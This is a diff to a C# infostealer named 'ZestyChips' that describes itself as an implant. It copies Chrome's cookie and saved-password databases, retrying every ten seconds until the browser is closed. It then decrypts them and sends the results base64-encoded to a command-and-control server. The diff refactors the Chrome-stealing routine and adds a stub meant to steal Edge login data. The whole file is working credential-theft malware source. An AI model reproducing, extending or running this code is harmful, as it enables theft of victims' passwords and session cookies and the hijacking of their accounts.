@@ -30,69 +30,84 @@ namespace ZestyChips
         private static void Chrome() {
             string cookies = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", "cc");
             string login = StealChromeData("\\Google\\Chrome\\User Data\\Default\\Login Data", "p");
-            // Helpers.PrintSuccess($"found chrome cookies: {cookies}");
-            // Helpers.PrintSuccess($"found chrome passwords: {login}");
         }
         
+        /*
+        * Steals edge data
+        */
+        private static string StealEdgeData() {
+            string result = string.Empty;
+
+            // check if we have edge data in the first place
+            bool hasEdgeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data");
+            if (hasEdgeData) {
+                return "Edge not found";
+            }
+
+
+            
+            return result;
+        }
+
         /*
         * Generic entry to steal data from vaults, given an input path and save file name
         * Returns a string, json serialised data
         */
         private static string StealChromeData(string path, string fileSaveName) {
-            bool hasChromeCookies = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
+            bool hasChromeData = !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path);
             string result = string.Empty;
 
-            if (hasChromeCookies) {
-                result = "Chrome not found";
-            } else {
-                try {
-                    for(;;) {
-                        // steal chrome cookies
-                        try {
-                            // copy file to dest file name
-                            File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
-                            break;
-                        } catch (Exception ex) {
-                            // exception will throw most likely if chrome is open
-                            // implant will continually run until chrome is closed / process terminated
-                            Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
-                            Thread.Sleep(10000); // sleep 10 seconds
-                        }
-                    }
+            if (hasChromeData) {
+                return "Chrome not found";
+            }
 
-                    switch (fileSaveName) {
-                        case "cc":
-                            result = DecryptChromeCookies(fileSaveName);
-                            Program.SendBase64EncodedData(result); // send data off to c2
-                            Helpers.PrintSuccess("chrome cookies stolen and sent to c2.");
-                            break;
-                        
-                        case "p":
-                            result = DecryptChromePasswords(fileSaveName);
-                            Program.SendBase64EncodedData(result); // send data off to c2
-                            Helpers.PrintSuccess("chrome passwords stolen and sent to c2.");
-                            break;
-
-                        default:
-                            result = "stealer error";
-                            break;
-                    }
-                } catch (Exception ex) {
-                    Helpers.PrintFail($"An error occurred: {ex.Message}");
-                    Program.SendBase64EncodedData($"[-] an error occurred during the stealing process for file {fileSaveName}. Error: {ex.Message}\n");
-                } finally {
-                    // clean up the temp file
-                    // currently not deleting the saved temp file, a handle is being kept alive, cannot close the handles correctly in the respective functions.
-                    // todo
+            try {
+                for(;;) {
+                    // steal chrome cookies
                     try {
-                        if (File.Exists(fileSaveName)) {
-                            File.Delete(fileSaveName);
-                        }
-                    } catch(Exception ex) {
-                        // Helpers.PrintFail($"Failed to delete file: {fileSaveName}, error: {ex.Message}");
+                        // copy file to dest file name
+                        File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + path, fileSaveName, true);
+                        break;
+                    } catch (Exception ex) {
+                        // exception will throw most likely if chrome is open
+                        // implant will continually run until chrome is closed / process terminated
+                        Helpers.PrintInfo("an error occurred copying cache: " + ex.Message);
+                        Thread.Sleep(10000); // sleep 10 seconds
                     }
-                    
                 }
+
+                switch (fileSaveName) {
+                    case "cc":
+                        result = DecryptChromeCookies(fileSaveName);
+                        Program.SendBase64EncodedData(result); // send data off to c2
+                        Helpers.PrintSuccess("chrome cookies stolen and sent to c2.");
+                        break;
+                    
+                    case "p":
+                        result = DecryptChromePasswords(fileSaveName);
+                        Program.SendBase64EncodedData(result); // send data off to c2
+                        Helpers.PrintSuccess("chrome passwords stolen and sent to c2.");
+                        break;
+
+                    default:
+                        result = "stealer error";
+                        break;
+                }
+            } catch (Exception ex) {
+                Helpers.PrintFail($"An error occurred: {ex.Message}");
+                Program.SendBase64EncodedData($"[-] an error occurred during the stealing process for file {fileSaveName}. Error: {ex.Message}\n");
+            } finally {
+                // clean up the temp file
+                // currently not deleting the saved temp file, a handle is being kept alive, cannot close the handles correctly in the respective functions.
+                // todo
+                try {
+                    if (File.Exists(fileSaveName)) {
+                        File.Delete(fileSaveName);
+                    }
+                } catch {
+                    // Helpers.PrintFail($"Failed to delete file: {fileSaveName}, error: {ex.Message}");
+                }
+                
             }
 
             return result;
